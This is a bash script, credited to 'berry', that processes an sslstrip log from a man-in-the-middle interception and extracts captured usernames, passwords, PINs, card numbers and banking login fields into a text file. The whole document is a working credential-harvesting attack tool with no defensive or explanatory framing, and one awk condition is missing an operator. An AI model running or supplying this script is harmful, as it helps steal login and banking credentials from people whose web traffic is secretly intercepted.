#!/bin/bash
echo "Do you want to save passwords to a file? (Y=keep)"
echo "(If you want to keep it, it will be saved in /home/bugtraq/Desktop/filename.pass.txt)"
read -e keeppd
if [[ $keeppd = "Y" || $keeppd = "y" ]] ; then 
        cat sslstrip.log  |
        awk -F "&" '!/GET/ && !/if/  !/header/ && !/^[0-9]/ && !/</ && /[PpEeUuLlCc_][A-Za-z]*=[A-Za-z0-9.%_-]*/ {if (NF >= 2) print $0}' |
        awk -F "&" '{for(i=1;i<=NF;i++) print $i }' |
        egrep -a -i "docNumber=|codidentific2=|codidentific=|contrasena=|codigo=|userid=|usercontras_IN=|PAN_IN=|clave=|numContrato=|PIN=|USUARIO=|_4=|_3=|_2=|_1=|identificador=|IDENTIFICADOR=|SXUSUI_E=|Documento=|passAux=|pwd=|pass=|passwd=|password=|textbox=|email=|user=|username=|login=|credential=|_user|_pwd=|email_address=" |
        awk -F "=" '{if (length($2) < 2) print "\b"; else if ($1 ~/[Pp]/) print "Password = " $2"\n"; else print "Login = ", $2}' >& /home/bugtraq/Desktop/filename.pass.txt 
        if [ -f "/home/bugtraq/Desktop/filename.pass.txt" ]; then 
                echo "Passwords saved !" 
                else echo "Error while saving passwords" 
        fi
        else echo "Password saving skipped."
fi
echo -e "\nBy created berry."
